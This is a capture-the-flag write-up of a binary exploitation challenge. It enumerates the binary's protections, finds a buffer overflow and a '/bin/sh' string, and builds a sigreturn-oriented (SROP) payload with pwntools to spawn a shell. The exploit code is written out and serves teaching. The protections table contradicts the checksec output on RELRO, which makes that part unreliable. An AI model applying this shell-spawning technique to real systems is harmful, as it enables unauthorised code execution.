# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
Arch:       amd64
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x42000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

### Protections 🛡️

As we can see, all protection are disabled and the binary has `RWX` segments:

| Protection | Enabled  | Usage   |
| :---:      | :---:    | :---:   |
| **Canary** | ❌       | Prevents **Buffer Overflows**  |
| **NX**     | ❌     | Disables **code execution** on stack |
| **PIE**    | ❌       | Randomizes the **base address** of the binary |
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The program has no interface, so we head into the disassembly right away.

### Disassembly

Starting with `_start()`:

![image](https://github.com/user-attachments/assets/38bc394c-4df5-4510-98a1-821a9ac64cb2)

![image](https://github.com/user-attachments/assets/f1b71c35-c417-4886-8d7d-c9c2c2ab5d9a)

That's the whole binary, we see there is a huge buffer overflow that `rdx` reads up to `0x106 = 262` bytes. First of all, we need to find a possible gadget and `/bin/sh` address.

```gdb 
pwndbg> find 0x43000, 0x43900, "/bin/sh"
0x43238
1 pattern found.
pwndbg> x/s 0x43238
0x43238:  "/bin/sh"
```

Now that we have this, we can craft the `SROP` chain.
We want to execute system("/bin/sh") but in assembly language it is execve("/bin/sh", argument, env ) function.
```python
# Srop
frame     = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = binsh           # pointer to /bin/sh
frame.rsi = 0x0             # NULL - second argument
frame.rdx = 0x0             # NULL - third argument
frame.rip = rop.syscall[0]  # the next command execute
```

After crafting the `frame`, we send the payload to trigger the vulnerability and get shell.

```python
pl  = b'deadbeef'
pl += p64(rop.rax[0])
pl += p64(0xf)
pl += p64(rop.syscall[0])
pl += bytes(frame)
```

Running solver remotely at IP port

### Result


![image](https://github.com/user-attachments/assets/1cfc6b67-e5b1-42c0-8116-027ec9c7467d)

